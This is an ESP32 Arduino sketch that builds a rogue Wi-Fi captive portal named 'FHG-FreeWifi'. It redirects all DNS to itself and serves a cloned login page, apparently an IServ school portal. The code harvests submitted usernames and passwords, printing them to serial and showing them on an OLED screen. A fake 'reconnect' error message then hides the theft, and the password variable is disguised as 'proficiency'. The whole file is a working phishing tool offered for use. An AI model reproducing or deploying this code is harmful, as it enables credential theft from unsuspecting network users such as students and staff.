#include <Arduino.h>
#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "FS.h"
#include <LittleFS.h>
#include <U8g2lib.h>
#include <Wire.h>

DNSServer dnsServer;
AsyncWebServer server(80);

U8G2_SSD1306_128X64_NONAME_F_SW_I2C oled(U8G2_R0, 22, 21);

String user_name;
String proficiency;
bool name_received = false;
bool proficiency_received = false;

class CaptiveRequestHandler : public AsyncWebHandler
{
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request)
  {
    // request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request)
  {
    request->send(LittleFS, "/index.html","text/html", false);
  }
};

void listDir(fs::FS &fs, const char * dirname, uint8_t levels){
    Serial.printf("Listing directory: %s\r\n", dirname);

    File root = fs.open(dirname);
    if(!root){
        Serial.println("- failed to open directory");
        return;
    }
    if(!root.isDirectory()){
        Serial.println(" - not a directory");
        return;
    }

    File file = root.openNextFile();
    while(file){
        if(file.isDirectory()){
            Serial.print("  DIR : ");
            Serial.println(file.name());
            if(levels){
                listDir(fs, file.name(), levels -1);
            }
        } else {
            Serial.print("  FILE: ");
            Serial.print(file.name());
            Serial.print("\tSIZE: ");
            Serial.println(file.size());
        }
        file = root.openNextFile();
    }
}

void setupServer()
{
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            {
      request->send(LittleFS, "/index.html","text/html", false);
      Serial.println("Client Connected"); });

  server.on("/auth.css", HTTP_GET, [](AsyncWebServerRequest *request)
            {request->send(LittleFS, "/auth.css","text/css");});

  server.on("/iserv.css", HTTP_GET, [](AsyncWebServerRequest *request)
            {request->send(LittleFS, "/iserv.css","text/css");});

  server.on("/logo.jpg", HTTP_GET, [](AsyncWebServerRequest *request)
            {request->send(LittleFS, "/logo.jpg","image");});

  server.on("/logo_white.118ffce4.svg", HTTP_GET, [](AsyncWebServerRequest *request)
            {request->send(LittleFS, "/logo_white.118ffce4.svg","image/svg+xml ");});
  
  server.on("/logo.a0b67669.svg", HTTP_GET, [](AsyncWebServerRequest *request)
            {request->send(LittleFS, "/logo.a0b67669.svg","image/svg+xml ");});



  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request)
            {
      String inputMessage;
      String inputParam;
  
      if (request->hasParam("_username")) {
        inputMessage = request->getParam("_username")->value();
        
        user_name = inputMessage;
        Serial.println(inputMessage);
        name_received = true;
      }

      if (request->hasParam("_password")) {
        inputMessage = request->getParam("_password")->value();
        
        proficiency = inputMessage;
        Serial.println(inputMessage);
        proficiency_received = true;
      }
      request->send(200, "text/html", "FEHLER:Bitte WLAN aus- und wieder einschalten und erneut verbinden."); });
}

void setup()
{
  oled.begin();
  oled.setFont(u8g2_font_t0_11b_tf);
  // put your setup code here, to run once:
  // your other setup stuff...
  Serial.begin(115200);
  if(!LittleFS.begin(true)){
    Serial.println("An Error has occurred while mounting LITTLEFS");
    return;
  }
  listDir(LittleFS, "/", 0);
  Serial.println();
  Serial.println("Setting up AP Mode");
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FHG-FreeWifi");
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  setupServer();
  Serial.println("Starting DNS Server");
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); // only when requested from AP
  // more handlers...
  server.begin();
  Serial.println("All Done!");
  
  
}

void loop()
{
  // put your main code here, to run repeatedly:
  dnsServer.processNextRequest();
  if (name_received && proficiency_received)
  {
    oled.clearDisplay();
    oled.sendBuffer();
    Serial.print("Name: ");
    oled.setCursor(0,8);
    oled.print(user_name);
    oled.setCursor(0,20);
    oled.print(proficiency);
    oled.sendBuffer();
    oled.clearBuffer();
    Serial.println(user_name);
    Serial.print("Passwort: ");
    Serial.println(proficiency);
    name_received = false;
    proficiency_received = false;
    Serial.println("We'll wait for the next client now");
  }
}